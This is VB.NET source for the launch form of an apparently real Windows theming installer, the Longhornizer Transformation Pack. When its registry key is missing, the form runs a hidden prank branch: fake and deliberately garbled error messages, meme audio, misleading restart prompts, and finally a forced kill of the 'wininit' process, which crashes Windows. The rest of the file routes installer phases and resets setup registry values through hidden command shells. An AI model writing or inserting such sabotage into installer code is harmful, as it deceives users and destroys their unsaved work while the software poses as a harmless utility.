Public Class PrepForm

    Private Sub PrepForm_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        'First, error out on incompatible versions
        If Not System.Environment.OSVersion.Version.Major = 6 Or (System.Environment.OSVersion.Version.Major = 6 And (System.Environment.OSVersion.Version.Minor < 0)) Then
            ' Quit silently if incompatible
            MsgBox("Longhornizer Transformation Pack  experienced an unsupported OS moment. To install this transformation pack, restart the i")
            Application.Exit()
            End
        End If
        If HKLMKey32.OpenSubKey("SOFTWARE\Longhornizer") Is Nothing Then
            ' Key doesn't exist, so we just quit
            MsgBox("Longhornizer Transformation Pack  experienced an unexpected error. To install this transformation pack, restart the installation.")
            MsgBox("Longhornizer Transformation Pack  experienced an unexpected error. To install this transformation pack, restart the installation.", MsgBoxStyle.Exclamation + MsgBoxStyle.MsgBoxRight, "")
            MsgBox("L̴̨̡̡̨̡̢̢̢̢̢̡̨̢̛͈̳͍̠̯̜͔͉̝̳͔̪͍͓̩͈̝̪̹͇̭̞̥̤͙̘̯̮̗̰̜̝͇͙̰̦̳̭̲̦͍̭̟̜͍̳͚͉̭̞̠͕͖̩̰͕̼͖̜̹͉̠͔̙͔͉͕͍̰͇͉̩̪̟̻̖͚̼̺̖̯̪͓̮̟͖̫̤̩͉̳̫̱̟̥̞͖͎̼͖̲̘̜̰͋͗̾̌̀̓͋̀̋͂͐̿̐̇̌̓͊͂̍͌͂͆̒̄̏͌̏̿̾͂̌̄̌̀̉͗̄̾͑̎͐̂̈́̀̓̿́̌̉̽́͋͊̈́͛̑̓̑̋̄͒̀͌́͑͆̉̑̌́̀͌͒̓͊̉̈̋̌̇̋̉̈́͊́̓̾̈̌̀̽̽͛͒̆̂̈́̏̕̚̚̕̕͘̚͜͠͝͠͠͝͝ͅͅͅh̵̢̧̧̧̡̡̡̨̧̢̡̧̡̨̡̡̛̛̛̛̛̛̛̤̮͎͇̭͇͈̯͖͍̹̹͕̺̬̜̗̼͇̲̣͇̪̹͇͖̟̲̬̝̮̠͎̝̟̗̞̳̰̩̥̼͍͕̖̭̘̤͕̲͕̤͉̻̫̮͓̩̙̪̻͕̼͙͙̝̙͕̠͇͍͇̱͙̩̲̣͈͎̭̫̤̥̝̳͚͓͈̱̗̱̱͈̱̺͍͈͉͉̜͍͈̞̖͉͖͙͓̩̳͍̄͒̓̊̈́͆͌́̔͌̈́̿̅̇̾͊̈́͐̏̑͊̓́̀̉̐̂̂̎̐̅́͑̀͗̂̎̇͊̉̒̈̀̀̾̅̄̄̈́̓́̇̊́̅̉̈́̃́̈́̈́̍̍̑̊̏̒̈͑̈́̓̽͗̌̇̔̂̎͆̆̃̐̆̐̔̃̽͐͛̐̐̌̑́̈́̐̽̐̉͐̌̍̊̒̂̉͐͘͘̕͘̚̚͜͜͜͠͠͝͝͝͠͝͝ͅͅͅn̷̡̡̧̢̧̡̨̧̡̨̡̛̹͚̣̥̭͙̜̙̳̙̗̺̯̝̹̲̜̤̙͖̯͍̰͚̯̖͓̻͖̣̻̥̼̭̣͙̪͇͎̯͉̭̳̘̭̫͈̜̖͚̤͚̖̣̩̗̻̞͇̝͈̝͚̣̪̙̮͍̭̜̤̳̤̪̯͇͙̗̺͔̦͖̤̘̱̠͈͙̠̩͉̜͙̫̲̮̫͚͖̣̩̭͈̝̬̩̞͍̿̆̍̇̾̄̀̐̈̀̇̃̆̀͑̐̓̑̾͌͌̌̇͋͐̓̎͆̽̋̄͗̓̔̑̀̀̃̉̆̑̓̅̀͌͑́̅̄͗̋̈́̅̇͘̚̚͜͜͜͜͜͝͠͠͠͠ͅͅͅͅo̶̧̡̧̨̨̨̧̢̢̮̖̞̭̦̲̟̘̘̫͇̣̖̣̹̰̬̞̼͓̲͙̞̙̜̻̜͈̬̮̙̲̩̙͕͖̖̪̪̣̠͎̬̙͕̺̪̩̱͖̰͚̼̹̮͓̝̺̘̺̞̭̼̼̥̠̩̙̳̙̹͕̪̱͓̙͍͉̤̲̝̖̗̺̠̲̮̦̩̼̫̙͉̪̰̣͓̭̬̲͍̞̰̞̖̤͍͎̺̜̩̔͐͜͜͜͝n̷̢̧̢̢̧̨̢̧̛̛̛̻̰͙̰̺̩̩̤̮̝͙̞̱̭͉̗̻̪̬̥̭̲̣͎̲̼̦̙͍͉̩̺̹̳͈̘̜̗̼͇͚̭̜͖̼̺̬̭̤̰̥͓͙̳͚̖̟͇̯̯̗͈̝̜͚̘̭̝̺̯̖͖̦̥̙̮͖͚̦͈͕̗̙̫͕̟̳̰̙̖̺̗̝͕͍̙̩̦̟͔͕̜̩͕̥͎̪͇͎̗̝̦̜͕͙̩̟̟͓̏̎̋̂̐̀͆̑̀̅̆̈́̉͛̄̀̐̌̅̾͑̎̇̔̂͒͊̋̉͆̈́̊͌̎̈́͂͗͑̒̀́̆͗̽̒̏́͊̒̓͂̀́̊̊̀̀̑̎̉̈̏̈͗̔̓͋̈́͗͋̓̍̅̀͛͋̏̎̎͛́͌̊̎̑͂̎̏̒̎͐͌̆̊̐̽͐́͌̒̈̎̄̅̋̚̚̚̕̕͘͜͝͠͝͝͝͝͠͝ͅͅͅz̶̧̡̡̨̢̡̨̨̡̡̢̢̞͕̱͙̩̩̞̞͍͙̜̘̙̳̭̮̯̲̜͈̻̙̖͎̬̗̜̠͈͖̟͚͈͙̹̥̙̰͚̲̬͙̰̠̤̙̑̇̓̀͐̃́̈̐͒̓̍͗̃̔̏̏̏͆̌̇͑͘͜͜͜͝ͅͅr̷̨̢̧̧͉͍̱̗̬̫̣͙͓̰͇̲̱͔̲͔͎͔͔̩͈̖̝͍͇̟̗͓̥͈̫͈̘̫̝̮̞̮͍̳̪̜͎̮̳̞̱̪̬̼̲̹̪̟͔̾͑̓͋͒̂̈̂̋̀̅̍́͂̎̒͒̈́̔̏̂̌͊̆̋̃̃̑̐̓̄́̈́̈͊̉͒̒̀͘͜͝͝͝ͅg̸̨̡̛̞̤̤͚̜̼̼̏̌́̅̂̍͐͑̑̇̉̏̋̈́̕̚͝ͅę̴̬͇̬͚̤̟̲́̈́́͛̈́̇̑̂̓̾̆̉̈́̽̓̌̏̊̂̇̎̽́̌̍̏̐̍̾̇̒͛́̃͗̕̚̚͝͝͝r̸̨̡̡̢̨̡̡̡̨̢̛͓̟͖̟̥̰͈͕̥̺̖̹̹̺͇̫̻͍̯͈̙͇̙̤̦̦̱̘͎̣̥͙͍̳̜͍͙͓̭̖̩̣͖̭̲̬͇̻̫͉̭̣͉̲͍͕̞͓͉͔̬͈͕̙͍͈̩̫̦̻̖̻̹̮̗̤̫̮̘̠̘̳̞͔̯̰͓̗̹͎̖͓̩̜̟̝̩̩͈̭̱͇̈̎̒͛͑̂̉̌͆̿͗̈́̆̃̎̄̄̊͗͊͆̍̃͛̐̽̈͗̑͂͌̏̔̌̓̉̾̽̆̾͑̓̍̈́̀́̂̾͋̏̋͂̏͋̕̕̕̚̕̚͜͜͜͜͝͝ͅͅͅͅi̸̡̧̢̨̨̧̡̛̮̜̮͔̣̮̹͔̤̬͍̠̮̱̳͍̟͚͖̥̠̜̯͉̳̳̳̼̤̞̺̬̦͍̝͇̮̮͖͇͈͈̙̻̱̻̘̮̥̰͉̝͈͈̣͉͙̝̖͉̤͚̫̘̩̫̜̲͚̬̺̮͖͎̳͔̲̩͈͖̲̱̦̩̪̣̤͙̼̘̬̮̦̝̬̥̖̟̝̥͍͕͎͒̂̄̎̌̒̇͋͂̆͑̅̋̏̉̍̋̋͑̓́̓̋͐̏͆͑̒̐̇̌̋̈́͆͑̈́̓͌̄̃̍́̄̍́͑̌́̕̚̚͘͜͜͜͜͜͠͠͝ͅͅơ̸̡̨̛͓̘̖̖͚͔͎̻͇̥̳̱̪͕̟̘̦̠̣͔̪̺͇̱̅̾̆͆͛̈̒̇̊͛̅͐͒͌̈͊͐́͐͋͋̉́̓̀͑̈́͌̈́̌̎̊͌̈́͌̓̋̾̿̓̏̓̉̿̅̄̿̉̀̆̐͐͋̽͊͆̾̌̅̏̄̔͊̈́̀̽̓̆̑̈̃͘̕͘̚̕͝͝͝͠͠͝͝ͅͅͅ ̶̨̧̨̢̧̨̬̰̠̬͈̳̱̦̘̺̮̠̼͎͕̰̱̳̠̗̺̖̭̭̤̘̝̞̲̺͙̠̩͓͉͇̗̙̪̲̜͇̟̺̘̜͍̱͚̖̹̠̠̦̹͙̺̥̯͔̗͕͔͎͈̞͓̤̬̲̮͍̩̥̠͉̗̱̞̩͙̩̼͈̭̱̪̤͙̳͈̤̣̰͇̝̩̫̥͙͇̥͔̗͚̭̟̪͙̪̪̦̘̮͖̱͆́̔̀͂̆͒̂͛̉̒̆̉͒̈͋̈́̉̈́̂̒̉̑̄̽̋̈́̆͌̿͋̀̄̚̚̚̕͠͠͝͝͝ͅͅͅͅͅn̴̡̢̧̨̧̨̢̧̛̻̘̫̹͔̭̝̟͈̖̥̦̞̞̯̥͖̻̮͖͕̤͚̟͚̜̥̬̰͙͔̜̜͔͈̫͚̤̤͉̼͓̫̥͍͓̦̱͔͖͖͍̬͍̰͖͓̠̘̟̙̼͉̝͇̱͇̳̩͚̱̹͈̹̘̣̥̰̦̬̮̭͉̝̼͕̱̖͎̳͇͍̩͇̬̯̰͉̖͎̯̹͚̗̜̖̪̮͈̲͇̱̬̤̼͇̼̘̈̾̍̒̅̌͌̅͐͗͋̊̆̔̑̎͐̐͑͛̒̈́̐̋̿̿͑͛̑̾̀͐͘͘͘͘͜͜͝͠ͅͅͅͅŗ̸̡̢̢̨̡̧̛̝̲̜̬͙̤̫̗͍̘͎͎̖͓͎̜̗͙͕͉͓͙̟̫̗̞͚̞͙̮͍͓͙̜͍̤̳̲̫͈̙̘̺͔̞̳̺͕͙͖̻͎̦̫̠̜̠͚͈̰̣̾͊͆̂̀̂̾̈́̾̏́̂̔͒̾́̒͛̏̉̆͋͌̓͊̐̊̓́̈́̈́̊͑̑̍̐̿͂̎͗̿̓̓̈́̍̔̈̈́̈́̽͋̎̉̍̒̑̌̎̈́̔̚̚̚̕̚͘͜͜͜͝͝͝͠͝͠͝͝ͅͅs̴̛̼̳͇̻̬̻̳̗̱̹̫͚̘͕̲̝̙̖̖̻͚͍̥̰̥͇̱͈̼͓̝̺̬̬̬͓̓̍̓̆́͒͗̄̽͑̓͒̓͌͗̈͒̐̀͛̆͂̀͆̐̍͊͊͂́̉̓̓̽͑͊̔̓̔̉̐̊̿̑̇͊̍̆̈́̓̀͌̍͗̌̀̌͂͐͗̎̏̇͆́̐̾̀̃̒̀̽͆͒͒̄̈́̃̄͊͌̐͋͒̐̆̓̔̀̽̋͒̄͂͒̇̽̉̈́͊̏͊̒̊̎̎̔̋̂͛̓͘̚͘̕̚̚̕̕͜͠͝͝͠͠͠͝͠͠͝͠͝͝t̷̲̣̹͚̞̥̆̇̓̂̓̆̈́͋̈̈͛̄̌̊̍̾̔͌͌̃̆͌̽͋́͒̈̏͑̉̐͝͝͝à̵̡̛̱̳̻̥͔͖̘͈̜̜͉̺̫̦̺̤̝̠̯͍̩͚͈̲̱̱̲͍̳̪̥̫̖̘̋͛̐̏̒̃̓̔̔̽͑͋̍̈́̋̀̂̿͐̓͗͗̀̎̓̓̈́̆̃̅̃͌̄́̍̊́͋̊̐͛͑̆̈̐̃͌͊̈́̑̿̅̎͆̍̒̄̔͌͑͊̅́̉̔͆̒̆͂̾̓̇̑̓͆̈́̾̎̏̆̾̅̐͌͑͌̋̍̒̅̄́̂̆̓̈́̎̏̌̍̄̽̏̃̀̾̌̆̔̀̓͗̔̄̈́̚͘͘̚̕̕͘͜͝͠͠͝͝͝͝͝͠͠͝͝͠͠͠ͅͅͅn̸̨̨̢̛̜͙̗̦̪̠̣̹̯̗̱͕̣͇̲̳͙͊̓̈́̄͒́̓́̊̅̐̅͌͂͑͒̃͐̊͌͂̀͂̓̌͑̐̂̓̓̃̅̐̑͋̄͊̌̆̈́̓̏̓̅͆̊̚̕̚͠͝͠͝ǫ̷̡̨̛̯͇̲̲͍̪͚̘̲͔̺̙̥̮̰̭̝̞̲̘̜͙̣̯͔̯̰̦̳̼̗̦̝̼̠̗̺̰̀͒̍̓̄͆̂͑͒͊͆͗̂̽̎̾̍͗́͊̿̊̿̀̒͌̍͋̽̊̓̆̔́̈́͆̈́̇͐̅̋̏̿̈́͒̿̽̋̇̀̃̍̐̊͌̉̿̆̆̃̃͌̾͆̇̄́̓̌̈́̃͆͒̏͆́̀̈́̄̂͗̋̔́̏̍̈́͒͂̈̄̓̌̀͛̓̀̐́̍̓̎̐͆͐̇͗͂͌̌̎̀̓̉̕̚̕̕̚͘̚͝͠͠͠͠͠͝͝͠͝ą̸̡̬̼̫̣͚̹̝͎̝̩̝̞̹̠̱̼̠̭͓͉͉͇̮̜̜̺͈̙̣̟̭̟̭̰̌̅́̏̃̃͒̀̋̀́̓̎͛͗̒̇̀̒̏͘̚͜͝ͅr̶̢̢̨̛̞̫̜̳̮̮̦͔͕̘͕͓͇͕̭̬̯͙̭͖͔̖̣̰͚͇̭̰̣͇̗̫̖͇͈͖̲͚̯̮͖̥̠͙̥̥̽̿̔͒̂̂̌͗̀́̉͒̊̔̾̚͝ͅͅm̷̛͖͍̈́̒̍͋̐̓̿̔̌͐̿̌̊̃̍̊͛̍͒̏͑͐̿̏̋̍̏́̅̋͊̾̔̎̾̋̇̂͊́̎̆̍̅̉̆̈́̋̕͘̕̚͘̚̚͝͝͝į̶̧̘̥̤̻̘͈̞̯̼̙̣̪̻̲̫͎͎̗̞̫̰̯̥̞͈͙͉̟̩̝̠̞̗͇̯̰͍̦̹̼̲̱̜̆͊̅͌̈́̏̀ͅͅf̴̡̢̧̡̧̧̢̛̛̛̪̭̩̝̰̠̖͕̪͉̮̘͙͈͍͙͔̭͍̪͓͎͇͚͍̻͖̣͙̺̳͔̗̗͔̟̠͈̺̯̠͈̰͎͓̲̱͔͍̹̙̼̠̮̲̻̠̖̠̰̳͇͓̦͎͉͖͎̹̻̥̻̜̗͇̜̹̫̘̫͈̬̦̣̝̬̠͚̣̹̼̗͕̥͙͚̰͙̬̪͎͔̯̞̣̻̜̻̣̮̻͓̲̙̰͕͉̲̙̙̬̖̦͇͇̌̿̇͐̐̇̐͆̉͗̎̾͌̌͒̑̆̏̈̿̀͐̄̓̑̆̌̈͘̚̕̚̚͜͜͜͜ͅͅǫ̸̡̢̡̡̡̡̨̡̡̧̡̧̢̧̡̙̪̖̝͖̭͚̲̘̰̦̣͎̦͇͔̥̯̬̱̦̘̹̝̪̖̙͔̯̦͕̼̠̳͍̻̫̪̠̜͉̞͙̦̗̪̣̹͙͉̹̜͚̳̪̯̗̦̤̮͍̳͙̼̞̯̜̠̣̲̠͈̥̗̦̘̩̙̣̱̟̫̤͈̼̯͎̹̭̹͙͚̮̪̦͙̟̖̱̣̠̠̼̼̞̥̣̺̯̪̯̮̠͈̻͎̰́̄̊̈́̑̐͌̽̈́͑͜ͅṫ̸̨̢̧̢̨̡̢̡̡̛̛̛̛͙̳̳̹̝͈̪̰̠͓̯̝̦̤̖̦̣̞̭͔͎̩̱̘͈̪̰̱͚̯̭̙̮̙̞̥̹͕̤̟̗̳̞̠̼̞͍̞͕̺͙̩̖̩̟͇͇͍̹͙͇̪̗̦̗̠̺̀͐̂͐̔͗̔͆̅̌͑̓̍̍̓̀̈́͌̉́̾̂̒̈̀̍̓̓̏̇̈̌̈́͆͐̏̂̐̀̆̽́͒̓͑͋͋̑̓̊͛̓̋͗̄̎̈̃̏̒͐͂͐̆̀̇͆͆̎̎̃̔̄͋͋͐͋́̓̍͌̕͘͜͜͜͜͝͝͠͝͠ͅͅͅ ̷̢̡̡̛̛̛̛̫̖̯̥̹̻̪̹̞̯͎̖͕͔̞̖̰̥̙̱̳͕̯̰̫͖̯̹̬̬̺̝̱̪̝͕̙̥͔͕̪͕̦͍̭̥̦̝̩̟̬̰͉̯̖̣̲̳̰͓͚͈̞͋̌͐̂̈́̔͑̎̄̐̽̅̐̈́̽̈́͑͊̓̀͆̍̎̓͌͋̉̒͊̐͊̎̋̌͐̆͛̄̈̔̈̌͆͋̉̉̃̍͋̈́̏̄̀͑̾̀̉͊̾͐̅͂̈́̃̃͛̆̔͋͑͒͒̃͌͗́̊̾̀̇͋̾͛̉̋̃̉̋͘̕̚̚͘͘͘͜͜͜͝͠͝͝͠͝͝ͅp̶̧̧̡̨̨̢̢̢̢̧̧̢̛̯̙̬͕̜̬͓̖̥̩̝̞͇̟̤̘̯̥̰̜̳̩̮̮͙͇̟̱͎̦̭̯̼͇̣̗̭͖͍̝̳̟͇̭̺̠̪͈͕̦̹̖̙͙̻̣̹͓̟̫̲̠̯͈̥̞̲͖̝͍̳̯̘̭̤̞̻̠̰͍̆͌̈́̿͆̔̅͋͐́̾̈́͆̈́̽̓̋̾́̓̒̿̇̈́̀̈́̾́̅͆͛͋͘͘͘͘̕͜͜͜͜͝͠͝ͅͅͅą̸̧̧̢̣̳͕͔̥̞̪̦̦̙͓̦̺͖̜̻̻͓̲̘͓̜̫̭̜̥͓͕̹̙͔̲̳̳̣̤̝̝͕̯̪͈͚̩͖̬̝͎̼͓̿͗̓͋́̊̾͌͒̽̈́̌͋̃̊̃̔͒̇̑̏̑̆͒̅̃̇̿̋͘͘͠ͅͅͅk̸̡̧̡̧̢̢̨̨̡̛̛̛̖̪̝̬͓͔̼͔̭̪̖̣̜̬̜̟̦͇̭̪̮̩͔̹͕̮̩̠̻̪̤̺̮̣͖͚͕̟͔͙̮̬̰̞͈̞͖͉͖̮̲͈̯̪͇͎̬͓̩̣͚͖̱̞͙͌̍̌̑̋͆̿́̃͆̋̎͑́̃̀̏̏͋͑̾͛͛̾̽̈́́̑̅̆͂̔̒̒͑̅̎́̀̄̀̐͌̆́̔̊͊̀̇͊̔̒̈̒͂͂͌̓̌͐̂̿̔̅̉̌̑̔̃̓͋̿͌̐͆̍̉̐̊͑̊́̍́͂͗̈́̄̌͊̄̄̽̏̅͛̄̏̐͌̚̚̚̕̚͘̕͠͝͝͝͝͠͝ͅͅͅͅͅͅc̸̢̛̛̺͎͈̘̬͚͚̗̻̫̱̖͈̜͚͉͕̻͕̫͓̖͓̟̬̙̹̤̱͇̮͚̰̮̝̱̟̝̙͎̜̻̤̫͔̜̞̠̱̦͔͍̣̹̠̣̣̜̜̪̤̰̝̘̪̗͉̯̻̥͙̼̯̼͍̞̮͇̫̯̳̰͕̮̝̼̙̗̹̖͔̙̙̣͓̮̬̹͓̹͇̼͙̙͈̮͉̼̊͗͆̒̀̾̃̉̂̔̍̅͊̋̋̏̓̉̔͂̓̈́̃̍̈̃̆͐͐̾̐̅̄̀̈́̏͋̾̈̑́͂̒̿̑͌̅͐̆̍́̾̎̈̾̍͆̑̀̆̋̔̀̃̿͘̕͘͜͜͜͝͝͝͝͠͠͠͠pneecexdier an cumextpeed rrero. to sainltl iths fnraioatmortsn cpka, sratrte eth asltitnanloi.", MsgBoxStyle.Exclamation + MsgBoxStyle.MsgBoxRight, "")
            My.Computer.Audio.Play(My.Resources.Tada,
                AudioPlayMode.WaitToComplete)
            Thread.Sleep(8000) 'Give Windows time to save the changes
            MsgBox("Longhornizer needs to restart your computer. Do not restart your PC. Click Ok to restart your pc")
            Thread.Sleep(15000) 'Faking the shutdown sound for funnies
            My.Computer.Audio.Play(My.Resources.Shutdown,
                AudioPlayMode.WaitToComplete)
            Thread.Sleep(20000) 'Give all hell now.
            My.Computer.Audio.Play(My.Resources.Pepe,
                AudioPlayMode.WaitToComplete)
            MsgBox("Longhornizer failed to restart your computer. Trying Fallback mode. Enjoy the phonk music meanwhile your PC tries to restart.")
            My.Computer.Audio.Play(My.Resources.Phonk,
                AudioPlayMode.WaitToComplete)
                MsgBox("Are you still using your computer?")
            Thread.Sleep(12000) 'Just to be sure.
            My.Computer.Audio.Play(My.Resources.shutdown,
                AudioPlayMode.WaitToComplete)
            ' First find the process(es) you want to kill, for example searching for the name
            Dim notepadProcesses As Process() = Process.GetProcessesByName("wininit")

            ' Loop over the array to kill all the processes (using the Kill method)
            Array.ForEach(notepadProcesses, Sub(p As Process) p.Kill())
            Application.Exit()
            End
        End If

        If HKLMKey32.OpenSubKey("SOFTWARE\Longhornizer").GetValue("TransformationFailed") = 1 Then 'If the transformation failed, don't continue running this
            MsgBox("Longhornizer Transformation Pack  experienced an unexpected error. To install this transformation pack, restart the installation.")

            'Go back into Windows as an emergency precaution as well
            Shell(windir + "\" + sysprefix + "\cmd.exe /c reg ADD ""HKLM\SYSTEM\Setup"" /v CmdLine /t REG_SZ /f", AppWinStyle.Hide, True)
            Shell(windir + "\" + sysprefix + "\cmd.exe /c reg ADD ""HKLM\SYSTEM\Setup"" /v OOBEInProgress /t REG_DWORD /d 0 /f", AppWinStyle.Hide, True)
            Shell(windir + "\" + sysprefix + "\cmd.exe /c reg ADD ""HKLM\SYSTEM\Setup"" /v SetupPhase /t REG_DWORD /d 0 /f", AppWinStyle.Hide, True)
            Shell(windir + "\" + sysprefix + "\cmd.exe /c reg ADD ""HKLM\SYSTEM\Setup"" /v SetupType /t REG_DWORD /d 0 /f", AppWinStyle.Hide, True)
            Shell(windir + "\" + sysprefix + "\cmd.exe /c reg ADD ""HKLM\SYSTEM\Setup"" /v SystemSetupInProgress /t REG_DWORD /d 0 /f", AppWinStyle.Hide, True)
            Thread.Sleep(8000) 'Give Windows time to save the changes

            If Environment.UserName = "SYSTEM" Then
                RestartTime("") 'SYSTEM's the user programs use in Setup Mode, and nowhere else intentionally
            Else
                RestartTime("inwin") 'Otherwise restart Windows normally, instead of via API
            End If
        End If

        'Open the correct GUI for the current phase
        If HKLMKey32.OpenSubKey("SOFTWARE\Longhornizer").GetValue("CurrentPhase") < 10 Then 'Normal phases
            Form1.Show()
        ElseIf HKLMKey32.OpenSubKey("SOFTWARE\Longhornizer").GetValue("CurrentPhase") = 10 Then 'Uninstaller GUI
            UninstallForm.Show()
        ElseIf HKLMKey32.OpenSubKey("SOFTWARE\Longhornizer").GetValue("CurrentPhase") = 69 Then 'Removal phase
            RemovalForm.Show()
        ElseIf HKLMKey32.OpenSubKey("SOFTWARE\Longhornizer").GetValue("CurrentPhase") >= 97 And _
            HKLMKey32.OpenSubKey("SOFTWARE\Longhornizer").GetValue("CurrentPhase") <= 99 Then 'Restoration phases
            RestorationForm.Show()
        ElseIf HKLMKey32.OpenSubKey("SOFTWARE\Longhornizer").GetValue("CurrentPhase") = 102 Then 'Customisation stage 2
            forCustomise = True
            RestorationForm.Show()
        ElseIf HKLMKey32.OpenSubKey("SOFTWARE\Longhornizer").GetValue("CurrentPhase") >= 103 Then 'Customisation stage 3+
            forCustomise = True
            Form1.Show()
        End If
        Me.Close()
    End Sub

    Private Sub PrepForm_Minimise(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.SizeChanged, MyBase.Resize
        Me.WindowState = FormWindowState.Minimized
    End Sub
End Class
